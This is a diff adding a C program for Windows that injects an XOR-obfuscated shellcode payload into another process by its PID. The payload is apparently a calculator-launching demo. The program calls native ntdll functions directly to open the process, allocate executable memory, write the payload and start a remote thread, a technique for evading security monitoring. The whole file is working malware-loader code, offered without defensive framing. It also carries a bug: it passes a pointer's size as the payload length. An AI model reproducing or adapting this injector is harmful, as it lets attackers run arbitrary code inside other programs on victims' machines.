@@ -1,0 +1,135 @@
+#include <stdio.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
+unsigned char key = 0xAA;
+unsigned char Payload[] = {
+    0x56, 0xE2, 0x29, 0x4E, 0x5A, 0x42, 0x6A, 0xAA, 0xAA, 0xAA, 0xEB, 0xFB, 0xEB, 0xFA, 0xF8,
+    0xFB, 0xFC, 0xE2, 0x9B, 0x78, 0xCF, 0xE2, 0x21, 0xF8, 0xCA, 0xE2, 0x21, 0xF8, 0xB2, 0xE2, 
+    0x21, 0xF8, 0x8A, 0xE2, 0x21, 0xD8, 0xFA, 0xE2, 0xA5, 0x1D, 0xE0, 0xE0, 0xE7, 0x9B, 0x63, 
+    0xE2, 0x9B, 0x6A, 0x06, 0x96, 0xCB, 0xD6, 0xA8, 0x86, 0x8A, 0xEB, 0x6B, 0x63, 0xA7, 0xEB,
+    0xAB, 0x6B, 0x48, 0x47, 0xF8, 0xEB, 0xFB, 0xE2, 0x21, 0xF8, 0x8A, 0x21, 0xE8, 0x96, 0xE2,
+    0xAB, 0x7A, 0x21, 0x2A, 0x22, 0xAA, 0xAA, 0xAA, 0xE2, 0x2F, 0x6A, 0xDE, 0xCD, 0xE2, 0xAB, 
+    0x7A, 0xFA, 0x21, 0xE2, 0xB2, 0xEE, 0x21, 0xEA, 0x8A, 0xE3, 0xAB, 0x7A, 0x49, 0xFC, 0xE2, 
+    0x55, 0x63, 0xEB, 0x21, 0x9E, 0x22, 0xE2, 0xAB, 0x7C, 0xE7, 0x9B, 0x63, 0xE2, 0x9B, 0x6A, 
+    0x06, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x92, 0x4A, 0xDF, 0x5B, 0xE6, 0xA9, 0xE6, 
+    0x8E, 0xA2, 0xEF, 0x93, 0x7B, 0xDF, 0x72, 0xF2, 0xEE, 0x21, 0xEA, 0x8E, 0xE3, 0xAB, 0x7A, 
+    0xCC, 0xEB, 0x21, 0xA6, 0xE2, 0xEE, 0x21, 0xEA, 0xB6, 0xE3, 0xAB, 0x7A, 0xEB, 0x21, 0xAE, 
+    0x22, 0xE2, 0xAB, 0x7A, 0xEB, 0xF2, 0xEB, 0xF2, 0xF4, 0xF3, 0xF0, 0xEB, 0xF2, 0xEB, 0xF3, 
+    0xEB, 0xF0, 0xE2, 0x29, 0x46, 0x8A, 0xEB, 0xF8, 0x55, 0x4A, 0xF2, 0xEB, 0xF3, 0xF0, 0xE2, 
+    0x21, 0xB8, 0x43, 0xFD, 0x55, 0x55, 0x55, 0xF7, 0xE2, 0x10, 0xAB, 0xAA, 0xAA, 0xAA, 0xAA, 
+    0xAA, 0xAA, 0xAA, 0xE2, 0x27, 0x27, 0xAB, 0xAB, 0xAA, 0xAA, 0xEB, 0x10, 0x9B, 0x21, 0xC5, 
+    0x2D, 0x55, 0x7F, 0x11, 0x4A, 0xB7, 0x80, 0xA0, 0xEB, 0x10, 0x0C, 0x3F, 0x17, 0x37, 0x55, 
+    0x7F, 0xE2, 0x29, 0x6E, 0x82, 0x96, 0xAC, 0xD6, 0xA0, 0x2A, 0x51, 0x4A, 0xDF, 0xAF, 0x11, 
+    0xED, 0xB9, 0xD8, 0xC5, 0xC0, 0xAA, 0xF3, 0xEB, 0x23, 0x70, 0x55, 0x7F, 0xC9, 0xCB, 0xC6, 
+    0xC9, 0xAA
+};
+SIZE_T payload_size = sizeof(Payload);
+typedef struct _UNICODE_STRING
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+typedef struct _CLIENT_ID {
+    PVOID UniqueProcess;
+    PVOID UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+typedef struct _OBJECT_ATTRIBUTES
+{
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+}  OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+#define InitializeObjectAttributes(p, n, a, r, s) \
+{ \
+	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
+	(p)->RootDirectory = r; \
+	(p)->Attributes = a; \
+	(p)->ObjectName = n; \
+	(p)->SecurityDescriptor = s; \
+	(p)->SecurityQualityOfService = NULL; \
+}
+typedef NTSTATUS(NTAPI* NtOpenProcess)(
+    PHANDLE            ProcessHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID         ClientId
+);
+typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory)(
+    HANDLE    ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T   RegionSize,
+    ULONG     AllocationType,
+    ULONG     Protect
+);
+typedef NTSTATUS(NTAPI* NtWriteVirtualMemory)(
+    HANDLE               ProcessHandle,
+    PVOID                BaseAddress,
+    PVOID                Buffer,
+    ULONG                NumberOfBytesToWrite,
+    PULONG               NumberOfBytesWritten OPTIONAL
+);
+typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
+    PHANDLE hThread,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID lpStartAddress,
+    PVOID lpParameter,
+    ULONG Flags,
+    SIZE_T StackZeroBits,
+    SIZE_T SizeOfStackCommit,
+    SIZE_T SizeOfStackReserve,
+    PVOID lpBytesBuffer
+);
+void xor_decrypt(unsigned char* data, unsigned char* output, size_t data_len) {
+    for (size_t i = 0; i < data_len; i++) {
+        output[i] = data[i] ^ key;
+    }
+}
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <pid>\n", argv[0]);
+        return 1;
+    }
+    DWORD pid = atoi(argv[1]);
+    HANDLE pThread = NULL;
+    HANDLE pOpen = NULL;
+    OBJECT_ATTRIBUTES attr{};
+    InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);
+    unsigned char* unxor = (unsigned char*)malloc(payload_size);
+    xor_decrypt(Payload, unxor,payload_size);
+    SIZE_T shellcode_size = sizeof(unxor);
+    CLIENT_ID cid{};
+    cid.UniqueProcess = (PVOID)pid;
+    cid.UniqueThread = 0;
+    HMODULE ntdll = LoadLibraryA("ntdll.dll");
+    if (!ntdll) {
+        printf("ntdll加载失败\n");
+        return 1;
+    }
+    NtOpenProcess pNtOpenProcess = (NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
+    pNtOpenProcess(&pThread, PROCESS_ALL_ACCESS, &attr, &cid);
+    if (pThread == NULL)
+    {
+        printf("调用失败\n");
+    }
+    NtAllocateVirtualMemory pNtAllocate = (NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+    PVOID address = NULL;
+    pNtAllocate(pThread, &address, 0, &shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    NtWriteVirtualMemory pNtWrite = (NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
+    pNtWrite(pThread, address, unxor, shellcode_size, NULL);
+    NtCreateThreadEx pNtCreate = (NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+    pNtCreate(&pOpen, PROCESS_ALL_ACCESS, NULL, pThread, address, NULL, 0, 0, 0, 0, NULL);
+    printf("函数调用结束\n");
+    CloseHandle(pThread);
+    CloseHandle(pOpen);
+    FreeLibrary(ntdll);
+
+    return 0;
+}
